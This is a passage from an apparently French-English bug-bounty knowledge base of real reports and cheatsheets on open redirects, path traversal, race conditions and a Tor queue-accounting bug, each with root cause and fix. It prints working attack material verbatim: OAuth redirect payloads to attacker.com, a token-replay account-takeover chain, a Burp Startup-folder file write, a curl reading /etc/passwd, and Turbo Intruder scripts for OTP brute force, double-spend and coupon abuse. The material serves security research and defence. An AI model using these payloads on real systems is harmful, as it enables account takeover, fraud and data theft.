CVE quick-recon index cited: CVE-2020-11022/11023 (jQuery XSS), CVE-2020-11110 (Grafana stored XSS), CVE-2021-24169 (WP plugin reflected XSS), CVE-2021-40875 (Gurock TestRail access control), CVE-2021-26084 (Confluence OGNL RCE).
```

**Techniques :** WordPress recon (403 bypass setup-config, XML-RPC abuse, user enum wp-json), Grafana known-CVE checklist (CVE-2020-13379 DoS SSRF avatar, CVE-2020-11110 stored XSS, CVE-2019-15043 unauth API, default creds admin:admin, signup enabled check), OS command injection blind payloads (ping -n / nslookup -q=cname via burpcollaborator), staging/dev admin endpoint guessing, CVE index utile pour recon rapide : CVE-2020-11022/11023 (jQuery XSS), CVE-2020-11110 (Grafana XSS), CVE-2021-24169 (plugin WordPress reflected XSS), CVE-2021-40875 (Gurock TestRail access control), CVE-2021-26084 (Confluence OGNL RCE)

**Correspond aux classes qualifiantes :** xss, rce, ssrf

**Signal (endpoints/fonctions observés) :**
- `/wp-admin/setup-config.php?step=1`
- `/xmlrpc.php`
- `/wp-json/wp/v2/users/`
- `/dev/register/`
- `/stag/register/`
- `/dev/login/`

---

## Open Redirect Chains

*4 cas.*

### Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter

**📄 Cas réel**
[source](https://hackerone.com/reports/3599248)

A previously patched open redirect on lovable.dev (blocking backslash payloads) was bypassed by supplying /..//google.com as the redirect value. The server normalizes the /../ traversal sequence and then interprets the remaining //google.com as a protocol-relative URL, redirecting authenticated users to an external domain post-login.

**Cause racine :** The original fix used an incomplete denylist (backslash variants only) instead of proper URL allowlist/parser-based validation, so path-traversal-plus-double-slash sequences that normalize into a protocol-relative URL were never accounted for.

**Preuve technique (verbatim depuis la source) :**

```
Prior fix (report #3581815) blocked only /\\ and /%5C. Bypass value not covered by that denylist:
https://lovable.dev/auth/post-login?redirect=/..//google.com
-> server normalizes /../ first, then treats the remaining //google.com as a protocol-relative URL -> final redirect: https://google.com (confirmed post-login, i.e. after the victim is already authenticated).
```

**Techniques :** path-traversal-normalization, protocol-relative-url, denylist-bypass, double-slash-trick

**Correspond aux classes qualifiantes :** open-redirect, path-traversal

**Signal (endpoints/fonctions observés) :**
- `https://lovable.dev/auth/post-login?redirect=/..//google.com`
- `/auth/post-login`

**Paramètres impliqués :** `redirect`

---

### Open Redirect Flow Abuse via OAuth Validation Bypass

**📄 Cas réel**
sévérité : critical · [source](https://academy.logicalbreach.com/writeups/duplicate-open-redirect-flow-abuse-via-oauth-validation-bypass-32d63048)

An OAuth authorization endpoint validated the callback_url/redirect_uri parameter using a weak startsWith() prefix match instead of proper URL parsing, allowing authority confusion, subdomain confusion, string concatenation, and port-separation variants to pass while browsers resolved the actual host to the attacker's domain. Confirmed end-to-end with an OOB domain receiving DNS and HTTP interactions.

**Cause racine :** The server validated the OAuth redirect parameter with an insecure string prefix match rather than parsing the URL into scheme/host/path and checking an exact allowlist.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable check (pseudocode, prefix match instead of exact URL parsing):
validationCheck = redirect_uri.startsWith("https://app.trusted-domain.com")
// returns true for: https://app.trusted-domain.com@attacker.com/

Confirmed bypass variants (all accepted by the allowlist check):
1) Authority confusion (userinfo@):
GET https://auth.redacted-domain.com/oauth/v1/authorize?response_type=code&client_id=web-client-app&callback_url=https://app.trusted-domain.com@attacker.com/
-> HTTP/2 302 Found / Location: https://app.trusted-domain.com@attacker.com/?error=unauthorized_client...
2) Subdomain confusion: ...&callback_url=https://app.trusted-domain.com.evil.com/  -> 302 Location: https://app.trusted-domain.com.evil.com/
3) String concatenation: ...&callback_url=https://app.trusted-domain.comevil.com/  -> 302 Location: https://app.trusted-domain.comevil.com/
4) Port separation + authority confusion: ...&callback_url=https://app.trusted-domain.com:8443@evil.com/  -> 302 Location: https://app.trusted-domain.com:8443@evil.com/
5) OOB end-to-end proof: ...&callback_url=https://app.trusted-domain.com.xyz123.oast.site/landing -> 302 Found, OOB listener logs both a DNS interaction and an HTTP GET /landing?error=...
```

**Techniques :** authority-confusion, startswith-prefix-match-bypass, subdomain-confusion, oob-callback-verification

**Correspond aux classes qualifiantes :** open-redirect, oauth

**Signal (endpoints/fonctions observés) :**
- `https://auth.redacted-domain.com/oauth/v1/authorize?...&callback_url=https://app.trusted-domain.com@attacker.com/`

**Paramètres impliqués :** `callback_url`, `redirect_uri`, `response_type`, `client_id`

---

### Open Redirect — Base64-Encoded Parameter Bypasses Client-Side Validation on Login Page

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/open-redirect-base64-encoded-parameter-bypasses-client-side-validation-on-login-page-d33fb2e0)

A DOM-based open redirect on an identity/SSO provider's terms-acceptance page decodes a base64-encoded param query parameter via atob() and assigns it directly to window.location.href after the user clicks 'Log In'. The client-side URL validator only checked the protocol (http/https), never the target domain, so any external URL could be reached through the trusted, branded login page.

**Cause racine :** The redirect target was decoded from a base64 parameter and used directly in window.location.href with only a client-side protocol check and no server-side domain validation.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable client code (Angular bundle, main.[HASH].js):
onSubmit() {
  let r = atob(decodeURIComponent(n.get("param") || ""));
  this.userGuidanceService.isValidHttpUrl(r) ? (window.location.href = r) : ...
}
isValidHttpUrl(n) {
  let r;
  try { r = new URL(n) } catch { return !1 }
  return "http:" === r.protocol || "https:" === r.protocol   // only checks PROTOCOL, never the host
}

Repro:
echo -n "https://attacker.com" | base64
# aHR0cHM6Ly9hdHRhY2tlci5jb20=
https://identity.[REDACTED].com/wayf/welcome?param=aHR0cHM6Ly9hdHRhY2tlci5jb20=
-> legitimate branded terms/login page loads; after user checks 'I Agree' and clicks 'Log In', browser redirects to https://attacker.com. No server-side validation of param at all -- the page is served regardless of its content.
```

**Techniques :** base64-encoding-obfuscation, client-side-only-validation, protocol-only-check, dom-based-redirect

**Correspond aux classes qualifiantes :** open-redirect

**Signal (endpoints/fonctions observés) :**
- `/wayf/welcome`
- `https://identity.[REDACTED].com/wayf/welcome?param=aHR0cHM6Ly9hdHRhY2tlci5jb20=`

**Paramètres impliqués :** `param`

---

### 1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3723458)

A domain-validation regex (KA_DOMAIN_REGEX) on khanacademy.org does not escape its dots, letting an attacker register a lookalike domain (e.g. xfarr-6fmjyrz2lq-uc-a-run.app) that passes validation meant to allow only legitimate subdomains. This enables an Open Redirect to the attacker's domain during the cross-domain auth mechanism, which passes a temporary auth transfer token in the URL in clear text — captured by the attacker's server and replayed on a legitimate *.khanacademy.org domain to obtain the victim's full session cookies, achieving one-click account takeover.

**Cause racine :** Dots in the KA_DOMAIN_REGEX are not escaped (. instead of \.), letting any character match and allowing illegitimate .app domains to pass validation for trusted redirect targets.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable regex (libs/urls/src/regexp.ts, dots between uc/a/run/app NOT escaped -- any char matches, not just '.'):
KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/

Intended match: legitimate-service-6fmjyrz2lq-uc.a.run.app
Attacker-registered domain that ALSO matches (hyphens substitute for the unescaped dots): xfarr-6fmjyrz2lq-uc-a-run.app

Phishing link:
https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F

Victim click triggers the app's cross-domain auth transfer, redirecting to:
https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/

Attacker's server logs the request:
GET /transfer_auth?key=<TOKEN>&continue=/ HTTP/1.1
Host: xfarr-6fmjyrz2lq-uc-a-run.app
-- token is NOT consumed here (the consuming JS never runs on the attacker's domain) -- attacker replays key=<TOKEN> on any real *.khanacademy.org page, the SPA calls transferAuthMutation, backend validates the token and issues Set-Cookie: KAAS/KAAL/KAAC/reauth_token for the victim -> full session, no password needed.
Fix: escape the dots -> ...uc\.a\.run\.app$/
```

**Techniques :** regex-bypass, open-redirect, token-replay, cross-domain-auth

**Correspond aux classes qualifiantes :** open-redirect, account-takeover

**Signal (endpoints/fonctions observés) :**
- `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F`
- `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/`
- `libs/urls/src/regexp.ts`

**Paramètres impliqués :** `continue`, `key`

---

## Path Traversal

*2 cas.*

### Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3712279)

Burp Suite Professional's browser-powered crawler processes <input type="file"> elements on a crawled page by creating a local upload file whose content and name are derived from page-controlled attributes (value and accept). The filename is not sanitized before being resolved via Path.resolve(), enabling path traversal; the PoC writes a malicious .bat file into the Windows Startup folder, executed on the next login.

**Cause racine :** The local filename created for an <input type="file"> is derived from the page-controlled accept attribute and is not sanitized against directory-traversal sequences before being resolved as a local path.

**Preuve technique (verbatim depuis la source) :**

```
Attacker HTML (served from attacker's own site, crawled by Burp's browser-powered crawler):
<!doctype html>
<html><body>
  <form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="upload" value="calc.exe"
      accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
    <button type="submit">Upload</button>
  </form>
</body></html>

Decompiled Burp internals (renamed for readability):
private static void prepareFileInput(FormInput input) throws IOException {
    File uploadFile = buildTemporaryUploadFile(input);
    Files.write(uploadFile.toPath(), bytes(input.inputValue()));
    input.browserElement().fileInput().selectFile(uploadFile.toPath());
}
private static File buildTemporaryUploadFile(FormInput input) throws IOException {
    String filename = input.deriveFileNameFromFileInput().orElse("file");
    Path tempDirectory = Files.createTempDirectory("burp");
    return tempDirectory.resolve(filename).toFile();  // <-- traversal via accept attribute, unsanitized
}
private Optional<FileName> deriveFileNameFromFileInput() {
    String accept = input.attribute("accept");  // page-controlled, attacker-supplied
    for (String token : accept.split(",")) {
        if (token.startsWith(".")) fileNameBuilder.addExtension(token);  // no traversal check
    }
    return Optional.of(fileNameBuilder.build());
}

Repro: Dashboard -> New scan -> Crawl -> target the malicious HTML page (served via `python -m http.server 8000`) -> Scan configuration: Deep, Browser behaviour: Always use Burp's browser -> after crawl, C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\burp_calc.bat contains calc.exe -> next login executes it.
```

**Techniques :** path-traversal, client-side-attribute-abuse, local-file-write, startup-persistence

**Correspond aux classes qualifiantes :** path-traversal, rce

**Signal (endpoints/fonctions observés) :**
- `prepareFileInput`
- `buildTemporaryUploadFile`
- `deriveFileNameFromFileInput`

**Paramètres impliqués :** `accept`, `value`, `type`

---

### Path Traversal via an Unauthenticated Export Download Action Using Client-Controlled Directory and Filename Parameters

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/path-traversal-via-an-unauthenticated-export-download-action-using-client-controlled-directory-and-filename-parameters-a9c49b9e)

A legacy Java web portal's unauthenticated download/export action accepted a client-controlled absolute directory parameter and filename parameter, streaming the resulting file with no authentication, allowlisting, or path canonicalization. No dot-dot traversal was even needed since the directory value was honored literally as an absolute path — confirmed to read /etc/passwd, /etc/hosts, mount tables, and database network configuration files from the production host.

**Cause racine :** The server builds the target file path directly from client-supplied directory and filename request parameters with no authentication, base-directory restriction, or canonical path validation.

**Preuve technique (verbatim depuis la source) :**

```
curl -s 'https://public-portal.redacted.example/[app]/[public-area]/[download-action].do?action=download&fileParam=passwd&directoryParam=/etc/' -H 'User-Agent: Mozilla/5.0 -BugBounty-redacted-research-'

Response:
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=passwd

root:x:0:0:Super-User:/root:/bin/sh
daemon:x:1:1::/:
...
appuser:x:10xx:10xx:Application Runtime:/opt/[redacted-app]:/bin/sh

No ../ traversal needed at all -- directoryParam is honored LITERALLY as an absolute directory. Same primitive confirmed with: /etc/+hosts (internal hostnames), /etc/+resolv.conf (internal DNS config), /etc/+os-release, /etc/+mount-table, /[db-client-path]/network/admin/+<db config> (production DB aliases/internal IPs/ports), /etc/+shadow (500/denied -- confirms non-root service account, no hashes leaked).
Likely server code pattern:
String directory = request.getParameter("directoryParam");
String fileName = request.getParameter("fileParam");
File target = new File(directory, fileName);
streamFileToHttpResponse(target);  // no canonicalization, no base-dir containment check, no auth
```

**Techniques :** absolute-path-injection, unauthenticated-arbitrary-file-read, no-canonicalization, no-directory-allowlist

**Correspond aux classes qualifiantes :** path-traversal

**Signal (endpoints/fonctions observés) :**
- `GET /[app]/[public-area]/[download-action].do?action=download&fileParam=<file>&directoryParam=<absolute-directory>`

**Paramètres impliqués :** `action`, `fileParam`, `directoryParam`

---

## Race Conditions — TOCTOU, Single-Packet Attack

*10 cas.*

### Single-Packet Attack — appliquer un coupon/crédit à usage unique plusieurs fois

**🧾 Cheatsheet**
sévérité : high · CWE-362

Technique moderne (post-2023, PortSwigger James Kettle) pour gagner la course serveur-side même sur des connexions internet variables : au lieu d'envoyer N requêtes séparées (chacune sujette à une latence réseau différente qui les désynchronise), on envoie N requêtes HTTP/2 sur UNE SEULE connexion TCP, toutes sauf le dernier octet de chacune, puis on lâche tous les derniers octets d'un coup — le serveur les reçoit à la microseconde près, quasi simultanément, quel que soit le jitter réseau du client.

**Cause racine :** Un compteur/flag 'déjà utilisé' est lu puis écrit en deux temps (lecture, décision, écriture) sans verrou transactionnel atomique ; N requêtes lisant l'état AVANT que la première ait écrit son résultat passent toutes la vérification.

**Preuve technique (verbatim depuis la source) :**

```
Outil : Turbo Intruder (extension Burp), script race_single_packet.py (fourni avec Burp).
Configuration clé du script Turbo Intruder :
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
for i in range(20):
    engine.queue(target.req, gate='race1')
engine.openGate('race1')  # lâche les 20 requêtes en même temps, un seul paquet TCP par connexion

Requête cible type (une des 20, identique sauf peut-être un identifiant de session dupliqué) :
POST /cart/apply-coupon HTTP/2
Host: shop.example.com
Cookie: session=abc123
Content-Type: application/json
Content-Length: 27

{"coupon_code":"SAVE50ONCE"}

Résultat attendu si vulnérable : les 20 réponses renvoient 200 OK 'Coupon applied' au lieu d'une seule 200 et dix-neuf 409/400 'Coupon already used'.
```

**Techniques :** single-packet-attack, http2-stream-multiplexing, last-byte-sync

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /cart/apply-coupon`
- `POST /wallet/redeem`

**Paramètres impliqués :** `coupon_code`, `redeem_token`

---

### Contournement de limite de tentatives OTP par requêtes parallèles

**🧾 Cheatsheet**
sévérité : critical · CWE-307

Un endpoint de vérification OTP limite les tentatives à 5 en incrémentant un compteur APRÈS avoir vérifié le code (lire compteur -> si <5 vérifier code -> si échec, incrémenter). En envoyant les 10000 codes possibles (0000-9999) en rafales parallèles synchronisées plutôt que séquentiellement, la plupart des requêtes lisent le compteur AVANT qu'il ait été incrémenté par les précédentes, contournant la limite de 5 tentatives et permettant un brute-force complet du 4-digit OTP en quelques secondes.

**Cause racine :** Le compteur de tentatives est incrémenté APRÈS la vérification du code plutôt qu'avant (ou de façon non-atomique), permettant à des requêtes concurrentes de toutes lire un compteur encore bas.

**Preuve technique (verbatim depuis la source) :**

```
Script Turbo Intruder (mode cluster-bomb + gate pour paralléliser un range complet) :
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, engine=Engine.THREADED)
    for code in range(10000):
        engine.queue(target.req, str(code).zfill(4))

def handleResponse(req, interesting):
    if 'success' in req.response or req.status == 200:
        table.add(req)

Requête paramétrée (%s = code testé) :
POST /auth/verify-otp HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 45

{"user_id":"12345","otp_code":"%s"}

Signal de vulnérabilité : plus d'un code accepté au global, ou taux de succès sur un range >5 tentatives.
```

**Techniques :** parallel-otp-bruteforce, rate-limit-race-bypass

**Correspond aux classes qualifiantes :** race-condition, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `POST /auth/verify-otp`

**Paramètres impliqués :** `otp_code`, `user_id`

---

### Double-spend via retrait/transfert simultané (TOCTOU sur solde)

**🧾 Cheatsheet**
sévérité : critical · CWE-367

Classique TOCTOU financier : l'API vérifie `if balance >= amount` puis, dans une requête SQL séparée, exécute `UPDATE balance = balance - amount`. En envoyant N requêtes de retrait simultanées, chacune lit le MÊME solde initial (ex: 100€) avant qu'aucune n'ait débité — un solde de 100€ avec 10 requêtes de retrait de 100€ simultanées peut retirer jusqu'à 1000€ au lieu de 100€, laissant potentiellement le solde négatif ou simplement retirant 10x le montant légitime.

**Cause racine :** Le contrôle de solde suffisant et le débit sont deux opérations SQL séparées, non enveloppées dans une transaction avec verrou (`SELECT ... FOR UPDATE`) ou une opération atomique (`UPDATE ... WHERE balance >= amount`).

**Preuve technique (verbatim depuis la source) :**

```
10 requêtes identiques envoyées en single-packet attack (Turbo Intruder, gate='race1') :
POST /wallet/withdraw HTTP/2
Host: bank.example.com
Authorization: Bearer <victim_token>
Content-Type: application/json
Content-Length: 38

{"amount":100,"destination":"ATTACKER_ACCT"}

Vérification post-attaque : GET /wallet/balance -> si balance < 0 ou si le total transféré dépasse le solde initial, la course est confirmée.
Fix correct côté serveur : UPDATE wallets SET balance = balance - 100 WHERE account_id = ? AND balance >= 100 -- puis vérifier rowcount == 1 avant de confirmer le retrait.
```

**Techniques :** toctou-balance-check, concurrent-withdraw, negative-balance

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /wallet/withdraw`
- `POST /account/transfer`

**Paramètres impliqués :** `amount`, `destination_account`

---

### Multi-réclamation d'un bonus de parrainage/inscription à usage unique

**🧾 Cheatsheet**
sévérité : medium · CWE-362

Un flag `referral_claimed=false` sur le profil utilisateur est lu, puis le bonus est crédité, puis le flag est mis à `true` — trois opérations non atomiques. Envoyer 20 requêtes de réclamation simultanées permet de faire créditer le bonus jusqu'à 20 fois avant que le flag ne se propage, un pattern qui s'applique à quasi tout mécanisme 'une seule fois par compte' (crédit de bienvenue, code promo, tirage au sort).

**Cause racine :** Vérification et mise à jour du flag 'déjà réclamé' en 3 étapes SQL séparées au lieu d'une opération atomique conditionnelle unique.

**Preuve technique (verbatim depuis la source) :**

```
Repro minimale avec curl en parallèle bash (moins précis que Turbo Intruder mais suffisant pour un flag à latence serveur non négligeable) :
for i in $(seq 1 20); do
  curl -s -X POST https://app.example.com/referral/claim \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"referral_code":"FRIEND50"}' &
done
wait
# Compter le nombre de réponses 200 'Bonus credited' -- si >1, la course est gagnée.
```

**Techniques :** race-condition-bonus-claim, one-time-reward-bypass

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /referral/claim`

**Paramètres impliqués :** `referral_code`

---

### TOCTOU sur upload de fichier : accéder au fichier avant la fin du scan antivirus

**🧾 Cheatsheet**
sévérité : high · CWE-367

Le fichier est écrit sur le stockage PUIS envoyé en scan antivirus asynchrone ; l'URL de téléchargement devient accessible dès l'écriture, avant la fin du scan. Un attaquant qui uploade un fichier malveillant et le télécharge/partage IMMÉDIATEMENT (dans la fenêtre de quelques centaines de ms à quelques secondes avant que le scan ne le mette en quarantaine) accède au fichier non scanné — utile si le fichier contient un payload destiné à un AUTRE utilisateur (ex: pièce jointe partagée) qui pourrait l'ouvrir avant la quarantaine.

**Cause racine :** Le fichier est rendu accessible en lecture avant que le résultat du scan de sécurité asynchrone ne soit connu, au lieu d'être marqué 'pending' et bloqué en lecture jusqu'à validation.

**Preuve technique (verbatim depuis la source) :**

```
Séquence : POST /upload (fichier EICAR ou payload réel) -> capturer file_id dans la réponse -> boucle GET /files/{file_id}/download en rafale (dizaines de requêtes/seconde) jusqu'à obtenir 200 avec le contenu au lieu de 403/404 -- mesurer le délai entre upload et blocage effectif :
UPLOAD_TS=$(date +%s%N)
FILE_ID=$(curl -s -F 'file=@eicar.txt' https://app.example.com/upload | jq -r .id)
for i in $(seq 1 200); do
  R=$(curl -s -o /dev/null -w '%{http_code}' https://app.example.com/files/$FILE_ID/download)
  if [ "$R" = "200" ]; then echo "Fenêtre TOCTOU: $(( ($(date +%s%N) - UPLOAD_TS) / 1000000 )) ms"; break; fi
done
```

**Techniques :** toctou-file-scan, race-window-malicious-file-access

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /upload`
- `GET /files/{id}/download`

**Paramètres impliqués :** `file_id`

---

### Survente d'un stock limité (flash sale) par réservation concurrente

**🧾 Cheatsheet**
sévérité : high · CWE-362

Sur une vente flash à stock limité (ex: 10 unités), l'application lit le stock restant, vérifie qu'il est suffisant, puis décrémente — en trois étapes distinctes. Envoyer 100 requêtes de réservation d'1 unité en même temps peut faire passer 100 réservations au lieu de 10, créant une survente massive que le business devra honorer ou annuler (dommage réputationnel + parfois obligation légale de livrer au prix affiché selon la juridiction).

**Cause racine :** Décrémentation du stock non atomique (lecture puis écriture séparées) au lieu d'une opération conditionnelle unique type `UPDATE stock SET qty = qty - 1 WHERE product_id = ? AND qty > 0`.

**Preuve technique (verbatim depuis la source) :**

```
Turbo Intruder, single-packet attack sur N=50 requêtes identiques :
POST /checkout/reserve HTTP/2
Host: shop.example.com
Cookie: session=<distinct par requête, comptes différents créés au préalable>
Content-Type: application/json
Content-Length: 35

{"product_id":"limited-edition-42","quantity":1}

Vérification : GET /admin/inventory/limited-edition-42 après l'attaque -- si qty < 0 ou si le total de réservations confirmées dépasse le stock initial affiché, la course est gagnée.
```

**Techniques :** race-condition-inventory-reservation, flash-sale-oversell

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /checkout/reserve`

**Paramètres impliqués :** `product_id`, `quantity`

---

### Fenêtre de course sur invalidation de token de reset de mot de passe

**🧾 Cheatsheet**
sévérité : high · CWE-367

Le token de reset de mot de passe est vérifié (valide + non expiré + non utilisé) puis le mot de passe est changé puis le token est marqué comme consommé, en trois étapes. Si un token de reset fuite (log, historique de navigateur partagé, lien intercepté) et que DEUX parties (victime légitime + attaquant) l'utilisent en quasi-simultané, les deux requêtes peuvent passer la vérification 'non utilisé' avant que l'une ne marque le token consommé -- les deux changements de mot de passe peuvent aboutir, le dernier écrivant en base gagnant silencieusement la course sans erreur visible pour l'autre partie.

**Cause racine :** La consommation du token de reset (marquage 'used') se fait après le changement de mot de passe plutôt qu'atomiquement lors de la lecture/validation du token (`UPDATE reset_tokens SET used=true WHERE token=? AND used=false` puis vérifier rowcount avant de continuer).

**Preuve technique (verbatim depuis la source) :**

```
Deux requêtes envoyées en single-packet attack avec des mots de passe DIFFÉRENTS pour distinguer laquelle a gagné :
POST /auth/reset-password HTTP/2 (requête A)
{"reset_token":"abc123","new_password":"AttackerPass1!"}

POST /auth/reset-password HTTP/2 (requête B, envoyée dans le même paquet)
{"reset_token":"abc123","new_password":"VictimPass2!"}

Si les DEUX retournent 200 OK (au lieu d'une seule 200 et une 400 'token already used'), la course est confirmée -- tester ensuite quel mot de passe est effectivement actif.
```

**Techniques :** race-condition-token-invalidation, concurrent-password-reset

**Correspond aux classes qualifiantes :** race-condition, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `POST /auth/reset-password`

**Paramètres impliqués :** `reset_token`, `new_password`

---

### Amplifier une race condition via le batching de requêtes GraphQL

**🧾 Cheatsheet**
sévérité : high · CWE-362

Quand une API GraphQL supporte le batching (un tableau JSON de plusieurs opérations dans un seul POST), N mutations identiques envoyées dans UN SEUL body HTTP sont exécutées par le serveur en parallèle (ou en séquence très rapprochée côté resolver) SANS jitter réseau du tout -- plus fiable qu'un single-packet attack HTTP classique pour gagner une race condition, car il n'y a même pas besoin de synchroniser plusieurs connexions TCP.

**Cause racine :** Le endpoint GraphQL accepte un batch de mutations et les exécute sans re-sérialiser chaque évaluation de contrainte métier (ex: solde, stock, compteur d'utilisation) dans une transaction isolée par mutation.

**Preuve technique (verbatim depuis la source) :**

```
Body JSON batché (tableau au lieu d'un objet unique, syntaxe supportée par Apollo Server/beaucoup d'implémentations) :
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

[
  {"query":"mutation { redeemCoupon(code: \"SAVE50ONCE\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50ONCE\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50ONCE\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50ONCE\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50ONCE\") { success } }"}
]

Si la réponse contient plus d'un `{"data":{"redeemCoupon":{"success":true}}}`, le coupon a été appliqué plusieurs fois via un seul round-trip HTTP.
```

**Techniques :** graphql-query-batching, race-condition-amplification

**Correspond aux classes qualifiantes :** race-condition, graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`, `variables`

---

### Technique 'connection warming' pour fiabiliser une course derrière un WAF/CDN

**🧾 Cheatsheet**
sévérité : medium · CWE-362

Certains WAF/CDN (Cloudflare notamment) introduisent une latence variable sur la PREMIÈRE requête d'une nouvelle connexion TCP (inspection, cache miss, résolution de règles) mais pas sur les suivantes réutilisant la même connexion keep-alive. Envoyer une requête 'de chauffe' (warm-up request, ex: un GET anodin) sur chaque connexion avant d'envoyer la vraie requête de la course stabilise le timing et rend le single-packet attack fiable même derrière une infrastructure qui ajoute un jitter sur les nouvelles connexions.

**Cause racine :** N/A — technique offensive de fiabilisation, pas une vulnérabilité en soi ; documente pourquoi une race condition réelle peut sembler 'non reproductible' en test naïf alors qu'elle est exploitable avec cette technique.

**Preuve technique (verbatim depuis la source) :**

```
Turbo Intruder, script avec warm-up avant le gate :
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    warmup = target.req.replace('/cart/apply-coupon', '/health')  # requête de chauffe anodine, même connexion
    for i in range(20):
        engine.queue(warmup, gate='warmup')
    engine.openGate('warmup')
    time.sleep(0.5)  # laisser les connexions se stabiliser
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

**Techniques :** connection-warming, waf-race-condition-reliability

**Correspond aux classes qualifiantes :** race-condition

---

### État partiel incohérent sur un checkout multi-étapes exécuté en parallèle

**🧾 Cheatsheet**
sévérité : medium · CWE-362

Un flux de checkout en 3 étapes stocke l'état intermédiaire dans une table `checkout_sessions` avec un champ `current_step`. Envoyer /step2 et /confirm quasi-simultanément (avant que /step1 n'ait fini d'écrire son résultat, ou en exploitant que /confirm ne revérifie pas que TOUTES les étapes précédentes sont réellement complètes en base au moment de sa propre exécution) permet de confirmer une commande avec un état de panier incohérent -- ex: un prix calculé à l'étape 1 (avant une remise) mais une commande confirmée avec une remise ajoutée entre-temps à l'étape 2, sans recalcul.

**Cause racine :** Le endpoint final (`confirm`) fait confiance à l'état `current_step` en base sans revalider atomiquement que chaque étape précédente a effectivement terminé son écriture avant de lire les valeurs qu'elle était censée produire.

**Preuve technique (verbatim depuis la source) :**

```
Séquence envoyée en parallèle (pas nécessairement single-packet, une désynchronisation de quelques dizaines de ms suffit souvent ici) :
POST /checkout/step2 HTTP/1.1 -- applique une remise
{"cart_id":"c-123","discount_code":"VIP20"}

POST /checkout/confirm HTTP/1.1 -- envoyée ~10-50ms après, avant que step2 n'ait fini d'écrire
{"cart_id":"c-123"}

Vérifier le prix final facturé vs le prix qui aurait dû s'appliquer compte tenu de l'ordre réel des opérations métier.
```

**Techniques :** multi-step-state-race, partial-checkout-state-abuse

**Correspond aux classes qualifiantes :** race-condition

**Signal (endpoints/fonctions observés) :**
- `POST /checkout/step1`
- `POST /checkout/step2`
- `POST /checkout/confirm`

**Paramètres impliqués :** `cart_id`, `step`

---

## Resource Accounting / DoS

*1 cas.*

### Malicious Conflux Endpoint Can Leave Stale Global OOO Queue Accounting After Teardown

**📄 Cas réel**
[source](https://hackerone.com/reports/3701692)

A malicious Conflux-capable Tor relay can send a CONFLUX_SWITCH gap followed by RELAY_DATA cells to force a client to queue out-of-order (OOO) messages. If the Conflux set is torn down before those messages are normally dequeued, the teardown path frees them without subtracting their cost from the global OOO byte-accounting counters, leaving the accounting permanently inflated until Tor restarts — the stale total counts against the memory ceiling used by Tor's OOM recovery logic.

**Cause racine :** The Conflux teardown path frees queued out-of-order messages without decrementing the global byte-accounting counters that the normal dequeue path correctly decrements.

**Preuve technique (verbatim depuis la source) :**

```
Root cause (src/core/or/conflux_pool.c, conflux_free_() -- frees queued OOO messages WITHOUT the matching accounting subtraction that the normal dequeue path performs):
SMARTLIST_FOREACH(cfx->ooo_q, conflux_msg_t *, cell, conflux_relay_msg_free(cell));
smartlist_free(cfx->ooo_q);
// missing: total_ooo_q_bytes -= cost; cfx->ooo_q_alloc_cost -= cost;  (present only in the NORMAL dequeue path)
Stale total later feeds src/core/or/relay.c:cell_queues_check_size() -> counts toward MaxMemInQueues for Tor's OOM circuit-close logic.

Recommended fix (accounted free helper):
static void conflux_free_queued_msg_accounted(conflux_t *cfx, conflux_msg_t *msg) {
  size_t cost = conflux_msg_alloc_cost(msg);
  if (BUG(total_ooo_q_bytes < cost)) total_ooo_q_bytes = 0; else total_ooo_q_bytes -= cost;
  if (BUG(cfx->ooo_q_alloc_cost < cost)) cfx->ooo_q_alloc_cost = 0; else cfx->ooo_q_alloc_cost -= cost;
  conflux_relay_msg_free(msg);
}

